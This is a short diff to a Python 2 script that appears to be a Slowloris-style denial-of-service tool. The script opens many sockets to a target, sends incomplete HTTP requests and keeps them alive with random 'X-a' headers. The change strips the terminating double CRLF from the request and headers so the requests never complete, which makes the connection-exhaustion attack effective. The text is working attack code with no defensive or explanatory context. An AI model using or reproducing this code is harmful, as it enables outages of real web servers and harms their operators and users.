@@ -48,10 +48,10 @@ def init_socket(ip):
     print ip
     s.connect((ip, 6942))
     #print "GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8")
-    s.send("GET /?{} HTTP/1.1\r\n\r\n".format(random.randint(0, 2000)).encode("utf-8"))
+    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
     for header in regular_headers:
-        print "{}\r\n\r\n".format(header).encode("utf-8")
-        s.send("{}\r\n\r\n".format(header).encode("utf-8"))
+        print "{}\r\n".format(header).encode("utf-8")
+        s.send("{}\r\n".format(header).encode("utf-8"))
     return s
 
 
@@ -78,7 +78,7 @@ def main():
         log("Sending keep-alive headers..Socket count: {}".format(len(list_of_sockets)))
         for s in list(list_of_sockets):
             try:
-                s.send("X-a: {}\r\n\r\n".format(random.randint(1, 5000)))
+                s.send("X-a: {}\r\n".format(random.randint(1, 5000)))
             except socket.error:
                 list_of_sockets.remove(s)
 
